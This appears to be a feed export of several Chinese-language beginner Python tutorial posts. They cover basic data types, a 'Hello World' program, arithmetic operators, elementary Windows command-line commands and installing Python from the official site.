<p>其中的<code>...</code>是交互式解释器输出的提示字符，不是字符串的一部分，这提示你这一条命令是多行的，还没完，后面的<code>&#39;&#39;&#39;</code>闭合了前面的<code>&#39;&#39;&#39;</code>，<code>)</code>闭合了前面的<code>(</code>，所以多行的命令结束，执行命令输出结果。在文件中表示为：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
第一行
第二行
第三行
'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>r</code>前缀同样可以使用在<code>&#39;&#39;&#39;多行的字符&#39;&#39;&#39;</code>。</p>
<p><strong>注意了</strong>：前面涉及python语法的标点符号都是<strong>半角</strong>的，当你确信自己的代码和作者的一样却不能正常运行，那么就要看看是不是标点符号的问题了。</p>
<h3 id="布尔型-bool"><a href="#布尔型-bool" class="headerlink" title="布尔型(bool)"></a>布尔型(bool)</h3><p>布尔类型只有两种值：<code>True</code>，<code>False</code>，即“真”和“假”。比如<code>1&gt;2</code>是假的，所以为<code>False</code>，<code>4&lt;5</code>是真的，所以为<code>True</code>。示例代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token boolean">True</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token boolean">False</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span><span class="token operator">></span><span class="token number">2</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">4</span><span class="token operator">&lt;</span><span class="token number">5</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还可以用<code>and</code>、<code>or</code>、<code>not</code>进行逻辑运算，分别对应数学中的 <strong>“且”</strong>、<strong>“或”</strong>、<strong>“非”</strong>，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token boolean">True</span> <span class="token keyword">and</span> <span class="token boolean">True</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token boolean">True</span> <span class="token keyword">and</span> <span class="token boolean">False</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token boolean">True</span> <span class="token keyword">or</span> <span class="token boolean">False</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">not</span> <span class="token boolean">True</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">not</span> <span class="token boolean">False</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">10</span><span class="token operator">></span><span class="token number">3</span> <span class="token keyword">and</span> <span class="token number">3</span><span class="token operator">></span><span class="token number">1</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>布尔值的常用于<strong>条件语句</strong>中，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token number">10</span><span class="token operator">></span><span class="token number">3</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"10大于3"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"10不大于3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件语句之后会单独讲解，不过聪明的读者应该能理解上面的代码的意思。</p>
<h3 id="空值（None）"><a href="#空值（None）" class="headerlink" title="空值（None）"></a>空值（None）</h3><p>python中还有一种特殊的类型，叫做空类型，只有一个值，就是<code>None</code>，表示什么都没有。暂时还没用到，用到再说。</p>
<h3 id="其它类型"><a href="#其它类型" class="headerlink" title="其它类型"></a>其它类型</h3><p>python中还有其它数据类型：列表（list）、元组（tuple）、字典（dict），还可以自定义类型，后面会提到，现在就到这。</p>
<hr>
<p>你还可以用<code>type()</code>获取数据的类型，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NoneType'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的<code>class</code>表明这是一个“类”，<code>int</code>、<code>str</code>、<code>bool</code>、<code>NoneType</code>都是“类”，解释这个暂时来说太早了，就当这是类型的名字，先忽略吧。</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·第一个python程序</title>
    <url>/5fcfad5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>几乎所有的计算机语言教程，不仅仅是python，都以这样一个<strong>相似的</strong>示例程序开始讲解——<span id="more"></span><strong>Hello World!</strong></p>
<p>代码如下，简简单单的一行。想必稍微了解英语的读者，都能猜到这段代码功能吧。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="如何运行代码？"><a href="#如何运行代码？" class="headerlink" title="如何运行代码？"></a>如何运行代码？</h3><p>代码有了，那么该怎么运行呢？？接下来介绍两种运行代码的方法。</p>
<h4 id="保存为文件"><a href="#保存为文件" class="headerlink" title="保存为文件"></a>保存为文件</h4><p>读者可以打开自己喜欢的文本编辑器，当然，记事本也是OK的。新建一个文本文件，文件名字随意，只要<strong>后缀名</strong>为<code>.py</code>即可，为了作者的叙述方便，我将采用“hello.py”。将代码写进去，并保存，代码中的双引号是<strong>半角的</strong>，要当心，不要输错。</p>
<p>然后，打开命令行，切换到文件所在目录，还记得前面所讲的吗？使用命令<code>cd</code>来切换目录。还有一种更方便的方法，图形界面打开文件所在的目录，按住键盘<kbd>shift</kbd>键，再用鼠标右键空白处，点击 <strong>“在此处打开命令窗口”</strong>，如下图：<br><img src="/images/5fcfad5/open_cmd.png" alt="打开cmd"></p>
<p><strong>打开后自动切换到文件所在的目录</strong></p>
<p>在命令行中输入，<code>python 代码的文件名</code>，比如这里代码文件名为“hello.py”，所以应输入<code>python hello.py</code>，记得按下回车键，命令行显示大致如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python hello.py
Hello World<span class="token operator">!</span>
<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>字符<code>&gt;</code>是提示字符，在实际中，应该是这样的：<code>当前路径&gt;</code>，我在这里就把路径省去了，毕竟这不是重点。</p>
<p><strong>声明一下</strong>：往后的文章基本上会少用截图来展示代码，会用类似上面的文字来讲解，因为作者认为，如果一篇文章下来全是图片，那么还不如拍视频教程（往后有拍视频这个打算<code>^_^</code>）。其次，图片真的很影响排版<code>╮(╯▽╰)╭</code>。如有必要的话，作者还是会贴上图片来说明的。</p>
<h4 id="交互式解释器"><a href="#交互式解释器" class="headerlink" title="交互式解释器"></a>交互式解释器</h4><p>像这样简单的一句代码，比起写在文件里，我更推荐直接用<strong>python交互式解释器</strong>来运行。那什么又是<strong>交互式</strong>呢？很简单，像命令行这样，人输入一条命令，命令行运行一条命令，运行完后再等待下一条命令……这种类似人与程序<strong>对话</strong>的方式，称为交互式。</p>
<p>在命令行中，输入<code>python</code>即可进入python交互式解释器。将会出现类似下面这样的版本信息：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> python
Python <span class="token number">3.7</span><span class="token number">.1</span> <span class="token punctuation">(</span>v3<span class="token punctuation">.</span><span class="token number">7.1</span><span class="token punctuation">:</span><span class="token number">260ec2c36a</span><span class="token punctuation">,</span> Oct <span class="token number">20</span> <span class="token number">2018</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>MSC v<span class="token punctuation">.</span><span class="token number">1915</span> <span class="token number">32</span> bit <span class="token punctuation">(</span>Inte
l<span class="token punctuation">)</span><span class="token punctuation">]</span> on win <span class="token number">32</span>
Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> mor information
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意啦</strong>，现在你是在和python解释器交互，而不是和cmd.exe交互，cmd.exe已经把控制权交给了解释器，所以你现在输入cmd的一些命令如<code>dir</code>是不起作用的，除非python解释器刚好对待“dir”这个字符串，像cmd.exe对待的一样，这是不可能的，读者们死心吧<code>╮(╯▽╰)╭</code>。</p>
<p>要是想结束解释器的交互，回到cmd的交互，那么只需输入<code>exit()</code>或者按下组合键<kbd>Ctrl</kbd> + <kbd>Z</kbd>，然后按下回车键即可。</p>
<p>在提示符<code>&gt;&gt;&gt;</code>后输入刚刚的代码，像这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>按下<strong>回车键</strong>，命令行显示为：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span>
Hello World
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="程序解析"><a href="#程序解析" class="headerlink" title="程序解析"></a>程序解析</h3><p>英文单词“print”是“打印”的意思，显然，代码<code>print(&quot;Hello World&quot;)</code>的作用是，在命令行中输出（打印）“Hello World”一行字符，并且输出后光标会进行<strong>换行</strong>。而<code>&quot;Hello World&quot;</code>是一个<strong>字符串</strong>。<br><code>print()</code>的括号中还可以用逗号(<strong>半角的</strong>)<code>,</code>分开多个字符串，表示打印多个字符串，字符串之间以空格分开，比如代码<code>print(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;)</code>将得到输出:</p>
<pre class="line-numbers language-none"><code class="language-none">1 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>程序会从上到下，一行一行按顺序，目前为止是这样，执行代码。比如下面这段代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我是第一行"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我是第二行"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我是第三行"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>保存为文件后运行得到输出：</p>
<pre class="line-numbers language-none"><code class="language-none">我是第一行
我是第二行
我是第三行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><p>仅仅打印几行字符，太简单了，既然计算机最擅长的就是计算，那么就来做一做计算。相信大家的早就在小学数学中掌握了四则运算也就是加减乘除了，如果你说不会<code>⊙▽⊙</code>，只能惋惜你一秒钟了。</p>
<p>来吧，先来做做加法，在交互式解释器中输入<code>1+1</code>按下回车键，结果如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span>
<span class="token number">2</span>
<span class="token operator">>></span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>1+1</code>太简单了，口算都可以，换个大的数吧<code>456423+786651</code>，读者可用计算器算算是不是这个：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">456423</span><span class="token operator">+</span><span class="token number">786651</span>
<span class="token number">1243074</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<p>那么减法呢？</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span>
<span class="token number">0</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">123</span><span class="token operator">-</span><span class="token number">456</span>
<span class="token operator">-</span><span class="token number">333</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">556</span><span class="token operator">-</span><span class="token number">999</span>
<span class="token operator">-</span><span class="token number">443</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不用算啦，结果保证准确<code>&lt;(￣ˇ￣)/</code></p>
<hr>
<p>乘法也类似，不过在计算机中用字符<code>*</code>表示乘号。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">123</span><span class="token operator">*</span><span class="token number">456</span>
<span class="token number">56088</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<p>至于除法，符号用斜杠<code>/</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token operator">-</span><span class="token number">123</span><span class="token operator">/</span><span class="token number">456</span>
<span class="token operator">-</span><span class="token number">0.26973684210526316</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">39</span><span class="token operator">/</span><span class="token number">3</span>
<span class="token number">13.0</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>细心的读者可能会注意到，<code>39/3</code>的结果是<code>13.0</code>而不是<code>13</code>，为什么一定要有小数点呢？这涉及到python<strong>数据类型</strong>，很快就提到啦，不要急，如果想要结果是<code>13</code>整数的话，那么可以把<code>/</code>换成<code>//</code>，像这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">39</span><span class="token operator">//</span><span class="token number">3</span>
<span class="token number">13</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>运算符<code>//</code>的也是进行除法，只不过结果是向下取整的整数，就是截去小数部分。</p>
<hr>
<p>这和我们在小学中学到的数学是一致的，没什么难的。读者可以自己尝试下做些复杂点的运算，比如下面这样把加减乘除都用上的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">123</span><span class="token operator">-</span><span class="token number">8546</span><span class="token operator">/</span><span class="token number">131</span><span class="token operator">*</span><span class="token number">231</span><span class="token operator">+</span><span class="token number">451</span>
<span class="token operator">-</span><span class="token number">14495.664122137405</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">/</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">1</span>
<span class="token number">9.0</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>总之，加减乘除所用的运算符为<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>（<code>//</code>），简单明了。</p>
<h4 id="其它运算"><a href="#其它运算" class="headerlink" title="其它运算"></a>其它运算</h4><p>猜猜下面是怎么运算的？</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span><span class="token operator">**</span><span class="token number">2</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">2</span>
<span class="token number">4</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">3</span><span class="token operator">**</span><span class="token number">2</span>
<span class="token number">9</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">4</span><span class="token operator">**</span><span class="token number">2</span>
<span class="token number">16</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">3</span>
<span class="token number">8</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读者们都猜到了吧，显然，<code>1**2</code>是1的平方，<code>2**3</code>是2的立方，所以<code>a**b</code>的意思是a的b次方。</p>
<hr>
<p>要想计算10除以3的余数，聪明的你可能会这么做</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然而，你还可以写得更简单：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">10</span><span class="token operator">%</span><span class="token number">3</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这个百分号<code>%</code>叫做取模运算符，用来取除法的余数，用于<strong>正数</strong>！！！，如果用于进行负数的运算的话，我也不知道会出现什么奇怪的结果，因为作者好像也不了解负数除法的余数是怎么定义的<code>(＠_＠;)</code>，比如这个：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">10</span><span class="token operator">%</span><span class="token operator">-</span><span class="token number">3</span>
<span class="token operator">-</span><span class="token number">2</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<p>好了，本文到此为止，接下来将接触python中的<strong>数据类型</strong>和<strong>变量</strong>。</p>
<p><code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（一）·命令行基本操作</title>
    <url>/9424038a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>先来了解下 <strong>“命令提示符”</strong>。</p>
<p>等等？！既然本篇文章标题是“命令行基本操作”，那怎么又说到“命令提示符”去了呢？客官莫要急，且听我说<span id="more"></span></p>
<blockquote>
<p>命令提示符是在操作系统中，提示进行命令输入的一种工作提示符。在不同的操作系统环境下，命令提示符各不相同。</p>
</blockquote>
<blockquote>
<p>在windows环境下，命令行程序为cmd.exe，是一个32位的命令行程序，微软Windows系统基于Windows上的命令解释程序，类似于微软的DOS操作系统。</p>
</blockquote>
<p>以上是摘自百度百科“命令提示符”的两段解释，想必大家也清楚了，在windows下，<strong>命令提示符</strong>和<strong>命令行</strong>指的都是同一样东西——<strong>cmd.exe</strong>，一个黑色方框的程序。</p>
<p>那么为什么python教程却要讲这个“黑框框”呢？其实这是为了后面的教程作铺垫，之后要用到命令行，提前讲对于后面的讲解方便很多，而且无论写什么程序，都免不了命令行操作，说到这可能有人要反驳我了。</p>
<blockquote>
<p>“C#语言和VB语言都是图形界面，不就不用命令行了吗？”</p>
</blockquote>
<blockquote>
<p>“我在visual studio中写C语言程序的时候怎么就不见要用命令行？”</p>
</blockquote>
<p>其实这都是<strong>IDE</strong>（Integrated Development Environment，<strong>集成开发环境</strong>）的“锅”，操作命令行什么的，IDE在底下偷偷帮你做好了，比如<strong>visual studio</strong>就是一个IDE，写好代码后，只要点击一下按钮，编译、链接、运行什么的都是它帮你做好了。说到底还是命令行，所以命令行是基本。况且，多学点东西也不是什么坏事。</p>
<h3 id="打开命令提示符"><a href="#打开命令提示符" class="headerlink" title="打开命令提示符"></a>打开命令提示符</h3><p>打开命令提示符即cmd.exe程序，有很多种方法，下面介绍几种常见的方法，当然啦，不只有这几种方法。</p>
<ol>
<li><p>鼠标点击<code>开始</code>，在搜索框中输入<code>cmd</code>，黑色图标那个就是cmd.exe，如下图：<br><img src="/images/9424038a/open_cmd_1.png" alt="打开cmd方式一"></p>
</li>
<li><p>鼠标依次点击：<code>开始</code>-&gt;<code>所有程序</code>-&gt;<code>附件</code>-&gt;<code>命令提示符</code>，如下图：<br><img src="/images/9424038a/open_cmd_2.png" alt="打开cmd方式二"></p>
</li>
<li><p>这是本人习惯的一种打开方式：按下键盘组合键 <kbd>win</kbd> + <kbd>R</kbd>，<kbd>win</kbd>键就是键盘上有windows徽标的那个键，在弹出的窗口中输入<code>cmd</code>按下回车即可，如下图：<br><img src="/images/9424038a/open_cmd_3.png" alt="打开cmd方式三"></p>
</li>
</ol>
<hr>
<p>无论您以哪种方式打开cmd，都将出现下面这样一个黑框框：<br><img src="/images/9424038a/cmd.png" alt="cmd窗口"></p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>在cmd中，你给出一条命令，cmd就会解析这条命令执行，完成后就等待你的下一条命令，要做事情就要懂”命令“，于是下面来介绍一下一些基本的命令。</p>
<p>显示当前目录下的文件与目录（<strong>“目录”</strong> 就是人们常说的 <strong>“文件夹”</strong>)，输入<code>dir</code>，如下图：<br><img src="/images/9424038a/dir_1.png" alt="显示目录下的文件与目录"></p>
<p>尖括号<code>&gt;</code>前面的字符就是当前所处的路径，图像中是<code>C:\Users\f1</code>，也就是说刚刚列出来的都是<code>C:\Users\f1</code>目录下的文件和目录。</p>
<p>若想浏览其它目录，可在命令后加一个目录名为参数，用空格隔开，格式为：<code>dir 目录名</code>，如浏览当前目录下的“Desktop”：<br><img src="/images/9424038a/dir_2.png" alt="显示目录下的文件与目录"></p>
<p>上面用到的参数是<strong>相对路径</strong>，“Desktop”是相对的，相对于当前路径，当然也可以用<strong>绝对路径</strong>来作为参数：<code>dir C:\Users\f1\Destop</code>。<code>.</code>表示当前路径，命令<code>dir .</code>可浏览当前目录，而<code>..</code>表示当前目录的上一级目录，又叫<strong>父目录</strong>（为什么不叫“母目录”就不要问我啦），命令<code>dir ..</code>可浏览上一级目录，这里就不放图啦。同样的，路径<code>.\a\b\..\1.txt</code>表示的是当前目录下的a目录下的b目录的父目录下的“1.txt”文件，等价于<code>.\a\1.txt</code>。</p>
<p><strong>注意了</strong>，windows下的文件名或目录名是不分大小写的，也就是说“Desktop”、“dEsktop”、“desktop”表示的都是同一个目录。若是目录名中间有空格，要用<strong>半角的</strong>双引号扩起来：<code>dir &quot;目录    名&quot;</code>（将输入法切换到<strong>英文输入</strong>后打出来的字符就是半角的）。<strong>建议不要用带有空格的路径</strong>。</p>
<p>切换目录：<code>cd 目录路径</code>，当然，路径可以是相对路径也可以是绝对路径。<br>因此，回到父目录的命令自然就是<code>cd ..</code></p>
<p>创建目录：<code>mkdir 目录名</code></p>
<p>删除<strong>空目录</strong>：<code>rmdir 目录名</code></p>
<p>删除<strong>整个非空目录</strong>：<code>rmdir /S 目录名</code>，还可加<code>/Q</code>参数可防止在删除每个文件前询问是否删除，即<code>rmdir /S /Q 目录名</code></p>
<p>删除文件：<code>del 文件名</code></p>
<p>删除目录下的所有文件：<code>del 目录</code>或<code>del 目录\*</code>，<code>*</code>是<strong>通配符</strong>，表示”全部“的意思。</p>
<p>切换盘符：不能直接用命令<code>cd</code>切换，切换到e盘应输入<code>e:</code></p>
<hr>
<p>上面有提到<code>/Q</code>、<code>/S</code>参数，其实准确的来讲，这两个叫“开关”，所有的cmd<strong>内部命令</strong>都可以使用一些开关来实现不同的功能，输入<code>help</code>可以查看有哪些内部命令，在内部命令中加开关<code>/?</code>可以查看该命令的帮助。</p>
<hr>
<p>上面关于命令行的知识其实对于现在来说已经基本够用了，如果后面教程要用其它命令行的知识的时候会解释给大家的。前面的都是铺垫，接下来就真的是开始python的教程了，想必大家都迫不及待了&lt;(￣︶￣)&gt;, Let’s go!</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（一）·python环境搭建</title>
    <url>/8447b565/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>python的环境搭建总的来说分为两大步：下载、安装（废话<code>@_@</code>）。在这里以<strong>windows</strong>为例<span id="more"></span>（<strong>Linux</strong>通常内置了python，就算没有内置，相信Linux用户也非常清楚软件的安装方法）</p>
<h3 id="第一步-下载解释器"><a href="#第一步-下载解释器" class="headerlink" title="第一步-下载解释器"></a>第一步-下载解释器</h3><p>前面说到，python是一门解释型语言，它需要一个解释器，或者说虚拟机，来翻译python代码并运行。因此，我们需要一个解释器，现在先去官方网站。</p>
<p>官方网站地址是：<a href="https://www.python.org">https://www.python.org</a>。</p>
<p>或者利用搜索引擎，如百度搜索，搜索关键词 <strong>“python”</strong>，情况如下，第一个链接就是:<img src="/images/8447b565/search_python.png" alt="百度搜索python"></p>
<p>在这多说一句，无论是下载什么软件都最好能去<strong>官方网站</strong>上下载，一般情况下，搜索引擎都会有一定的<strong>标识</strong>来指示官方的网站的。千万不要去什么<del>下载站</del>那些地方下载软件，也不知道会有什么<strong>病毒</strong>。</p>
<p>进入官网后如下图，点击导航栏中的<strong>Downloads</strong>按钮<br><img src="/images/8447b565/python_org.png" alt="官网界面"><br>直接点击<strong>最大的黄色按钮</strong>即可，网站会自动检测系统（按钮中的显示<strong>python3.7.1</strong>，可见python3.x是将来的发展趋势）<br><img src="/images/8447b565/python_org_download.png" alt="下载选择"><br>点击后，在网页底部选择<strong>箭头所指处</strong>，下载。</p>
<p><strong><em>注意</em></strong>：这是<strong>32位</strong>的安装包，若系统是<strong>64位</strong>则选择 <strong>“Windows x86-64 executable installer”</strong>。<br><img src="/images/8447b565/python_org_download_37.png" alt="python37"></p>
<h3 id="第二步-安装"><a href="#第二步-安装" class="headerlink" title="第二步-安装"></a>第二步-安装</h3><p>下载完成后，双击安装包。</p>
<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>勾选下面的<code>Add Python 3.7 to PATH</code>，这个是将python添加到<strong>环境变量</strong>，如果忘记勾选，不用担心，后面有讲怎么手动添加<strong>环境变量</strong>。然后点击上面的<code>Install Now</code>，这个是<strong>默认安装</strong>，很明显默认安装路径是<code>C:\User\你的用户名\AppData\Local\Programs\Python\Python37-32</code>，而且一同安装<code>IDLE</code>（python自带的IDE，即集成开发环境），<code>pip</code>（python的一个包管理工具）等。若是点击了下面的<code>Customize installation</code>则是自定义安装，有需要的读者可自定义安装，但要记得勾选安装<code>pip</code>，其他默认即可<br><img src="/images/8447b565/python_install_0.png" alt="step1"></p>
